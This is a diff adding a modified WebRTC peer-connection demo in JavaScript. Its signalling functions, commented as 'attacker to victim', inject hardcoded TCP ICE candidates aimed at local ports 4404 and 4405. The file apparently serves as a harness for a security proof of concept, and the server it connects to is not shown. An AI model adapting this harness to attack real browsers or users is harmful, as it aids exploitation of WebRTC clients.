@@ -1,0 +1,217 @@
+/*
+ *  Copyright (c) 2015 The WebRTC project authors. All Rights Reserved.
+ *
+ *  Use of this source code is governed by a BSD-style license
+ *  that can be found in the LICENSE file in the root of the source
+ *  tree.
+ */
+
+'use strict';
+
+const startButton = document.getElementById('startButton');
+const callButton = document.getElementById('callButton');
+const hangupButton = document.getElementById('hangupButton');
+callButton.disabled = true;
+hangupButton.disabled = true;
+startButton.addEventListener('click', start);
+callButton.addEventListener('click', call);
+hangupButton.addEventListener('click', hangup);
+
+let startTime;
+const localVideo = document.getElementById('localVideo');
+const remoteVideo = document.getElementById('remoteVideo');
+
+localVideo.addEventListener('loadedmetadata', function() {
+  console.log(`Local video videoWidth: ${this.videoWidth}px,  videoHeight: ${this.videoHeight}px`);
+});
+
+remoteVideo.addEventListener('loadedmetadata', function() {
+  console.log(`Remote video videoWidth: ${this.videoWidth}px,  videoHeight: ${this.videoHeight}px`);
+});
+
+remoteVideo.addEventListener('resize', () => {
+  console.log(`Remote video size changed to ${remoteVideo.videoWidth}x${remoteVideo.videoHeight}`);
+  // We'll use the first onsize callback as an indication that video has started
+  // playing out.
+  if (startTime) {
+    const elapsedTime = window.performance.now() - startTime;
+    console.log('Setup time: ' + elapsedTime.toFixed(3) + 'ms');
+    startTime = null;
+  }
+});
+
+let localStream;
+let pc1;
+let pc2;
+const offerOptions = {
+  offerToReceiveAudio: 1,
+  offerToReceiveVideo: 1
+};
+
+function getName(pc) {
+  return (pc === pc1) ? 'pc1' : 'pc2';
+}
+
+function getOtherPc(pc) {
+  return (pc === pc1) ? pc2 : pc1;
+}
+
+async function start() {
+  console.log('Requesting local stream');
+  startButton.disabled = true;
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: true});
+    console.log('Received local stream');
+    localVideo.srcObject = stream;
+    localStream = stream;
+    callButton.disabled = false;
+  } catch (e) {
+    alert(`getUserMedia() error: ${e.name}`);
+  }
+}
+
+async function call() {
+  callButton.disabled = true;
+  hangupButton.disabled = false;
+  console.log('Starting call');
+  startTime = window.performance.now();
+  const videoTracks = localStream.getVideoTracks();
+  const audioTracks = localStream.getAudioTracks();
+  if (videoTracks.length > 0) {
+    console.log(`Using video device: ${videoTracks[0].label}`);
+  }
+  if (audioTracks.length > 0) {
+    console.log(`Using audio device: ${audioTracks[0].label}`);
+  }
+  const configuration = {iceServers: [{urls: 'stun:stun.l.google.com:19302'}]};
+  console.log('RTCPeerConnection configuration:', configuration);
+  pc1 = new RTCPeerConnection(configuration);
+  console.log('Created local peer connection object pc1');
+  pc1.addEventListener('icecandidate', e => signalFromPc1(pc1, e));
+  pc2 = new RTCPeerConnection(configuration);
+  console.log('Created remote peer connection object pc2');
+  pc2.addEventListener('icecandidate', e => signalFromPc2(pc2, e));
+  pc1.addEventListener('iceconnectionstatechange', e => onIceStateChange(pc1, e));
+  pc2.addEventListener('iceconnectionstatechange', e => onIceStateChange(pc2, e));
+  pc2.addEventListener('track', gotRemoteStream);
+
+  localStream.getTracks().forEach(track => pc1.addTrack(track, localStream));
+  console.log('Added local stream to pc1');
+  localStream.getTracks().forEach(track => pc2.addTrack(track, localStream));
+
+  try {
+    const offer = await pc1.createOffer(offerOptions);
+    await onCreateOfferSuccess(offer);
+  } catch (e) {
+    onCreateSessionDescriptionError(e);
+  }
+}
+
+function onCreateSessionDescriptionError(error) {
+  console.log(`Failed to create session description: ${error.toString()}`);
+}
+
+async function onCreateOfferSuccess(desc) {
+  try {
+    await pc1.setLocalDescription(desc);
+    onSetLocalSuccess(pc1);
+  } catch (e) {
+    onSetSessionDescriptionError();
+  }
+
+  try {
+    await pc2.setRemoteDescription(desc);
+    onSetRemoteSuccess(pc2);
+  } catch (e) {
+    onSetSessionDescriptionError();
+  }
+
+  // Since the 'remote' side has no media stream we need
+  // to pass in the right constraints in order for it to
+  // accept the incoming offer of audio and video.
+  try {
+    const answer = await pc2.createAnswer();
+    await onCreateAnswerSuccess(answer);
+  } catch (e) {
+    onCreateSessionDescriptionError(e);
+  }
+}
+
+function onSetLocalSuccess(pc) {
+  console.log(`${getName(pc)} setLocalDescription complete`);
+}
+
+function onSetRemoteSuccess(pc) {
+  console.log(`${getName(pc)} setRemoteDescription complete`);
+}
+
+function onSetSessionDescriptionError(error) {
+  console.log(`Failed to set session description: ${error.toString()}`);
+}
+
+function gotRemoteStream(e) {
+  if (remoteVideo.srcObject !== e.streams[0]) {
+    remoteVideo.srcObject = e.streams[0];
+    console.log('pc2 received remote stream');
+  }
+}
+
+async function onCreateAnswerSuccess(desc) {
+  try {
+    await pc2.setLocalDescription(desc);
+    onSetLocalSuccess(pc2);
+  } catch (e) {
+    onSetSessionDescriptionError(e);
+  }
+  try {
+    await pc1.setRemoteDescription(desc);
+    onSetRemoteSuccess(pc1);
+  } catch (e) {
+    onSetSessionDescriptionError(e);
+  }
+}
+
+let addedTo1 = false;
+let addedTo2 = false;
+// signal from attacker to victim
+async function signalFromPc1(pc, event) {
+  const remotePort = 4404; // server listens on 4404 and 4405 respectively
+  if (!addedTo2) {
+    addedTo2 = true;
+    pc2.addIceCandidate({sdpMLineIndex: 0, candidate: 'candidate:0 1 tcp 1350566143 localhost ' + remotePort + ' typ host tcpType active'});
+  }
+}
+
+// on attacker, need to intercept addIceCandidate
+async function signalFromPc2(pc, event) {
+  const remotePort = 4405; // server listens on 4404 and 4405 respectively
+  if (!addedTo1) {
+    addedTo1 = true;
+    pc1.addIceCandidate({sdpMLineIndex: 0, candidate: 'candidate:0 1 tcp 1350566143 localhost ' + remotePort + ' typ host tcpType active'});
+  }
+}
+
+function onAddIceCandidateSuccess(pc) {
+  console.log(`${getName(pc)} addIceCandidate success`);
+}
+
+function onAddIceCandidateError(pc, error) {
+  console.log(`${getName(pc)} failed to add ICE Candidate: ${error.toString()}`);
+}
+
+function onIceStateChange(pc, event) {
+  if (pc) {
+    console.log(`${getName(pc)} ICE state: ${pc.iceConnectionState}`);
+    console.log('ICE state change event: ', event);
+  }
+}
+
+function hangup() {
+  console.log('Ending call');
+  pc1.close();
+  pc2.close();
+  pc1 = null;
+  pc2 = null;
+  hangupButton.disabled = true;
+  callButton.disabled = false;
+}
